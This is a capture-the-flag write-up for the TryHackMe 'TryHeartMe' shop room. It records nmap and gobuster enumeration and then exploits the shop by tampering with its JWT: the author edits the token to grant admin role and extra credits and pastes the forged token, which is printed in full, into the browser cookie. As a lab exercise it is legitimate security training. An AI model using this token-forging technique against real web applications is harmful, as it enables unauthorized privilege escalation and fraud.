A THM Room 
By Sovren
Part of the Love at First Breach 2026 Event

My Dearest Hacker,

The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?   
You can access the web app here: `http://MACHINE_IP:5000`


# Reconnaissance 

Successfully made a fake email account. 
a@gmail.com:password 

/product is a valid directory and will be enumerated to find the name of the page containing the 'valenflag' item. 

cookie has a jwt value (JSON Web Token)

https://www.jwt.io/ - this site can be used to decode or encode JWTs.

# Enumeration

#### Nmap

`sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.80.162.22 -p-`

`PORT     STATE SERVICE VERSION`
`22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   256 e7:52:0f:ec:41:b5:09:19:5e:50:33:4c:c0:bb:bf:f0 (ECDSA)`
`|_  256 5e:ab:01:36:a7:21:07:3b:a7:79:a2:67:84:6a:a4:f1 (ED25519)`
`5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)`
`|_http-title: TryHeartMe \xE2\x80\x94 Shop`
`Device type: general purpose|phone|specialized`
`Running (JUST GUESSING): Linux 4.X|5.X|2.6.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)`
`OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32`
`Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)`
`No exact OS matches for host (test conditions non-ideal).`
`Network Distance: 3 hops`
`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`


#### Gobuster

`gobuster dir -u http://10.80.162.22:5000 -w /usr/share/wordlists/dirb/common.txt`

`account              (Status: 302) [Size: 227] [--> /login?next=/account]`
`admin                (Status: 302) [Size: 223] [--> /login?next=/admin]`
`login                (Status: 200) [Size: 1461]`
`logout               (Status: 302) [Size: 189] [--> /]`
`register             (Status: 200) [Size: 1517]`

I also tried to run various gobuster and ffuf on the /product directory. It doesn't appear in the gobuster scan above, but was found during the reconnaissance stage by clicking on a product of the website. 



# Exploitation

The site uses JWTs (JSON Web Tokens) and is vulnerable to Broken Authentication. 
The original JWT can be decoded via https://www.jwt.io/ 
We can then edit the result and encode our own JWT which we can copy and paste into the cookie section of our browser. 

Here is the PAYLOAD: DATA I went with:

`{`
  `"email": "a@gmail.com",`
  `"role": "admin",`
  `"credits": 10000,`
  `"iat": 1771103396,`
  `"theme": "valentine"`
`}`

and the resulting JWT I pasted into cookies via inspector: 

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwiY3JlZGl0cyI6MTAwMDAsImlhdCI6MTc3MTEwMzM5NiwidGhlbWUiOiJ2YWxlbnRpbmUifQ.VIVH6FRgOiuNZMHXNn9Ti13jUBptqTguxey5IDoZmuM`

Once complete, the page will reveal the ValenFlag item which can be purchased for 777 credits. 


# Reporting

This assessment evaluated the security of the TryHeartMe shop web application, focusing on authentication, authorization, and business logic controls. The goal was to identify a weakness that would allow access to a hidden product (“Valenflag”) intended to be restricted from normal users.

The application was found to be vulnerable to Broken Authentication and Authorization due to improper handling of JSON Web Tokens (JWTs). By manipulating client-side token data, it was possible to escalate privileges and bypass purchase restrictions.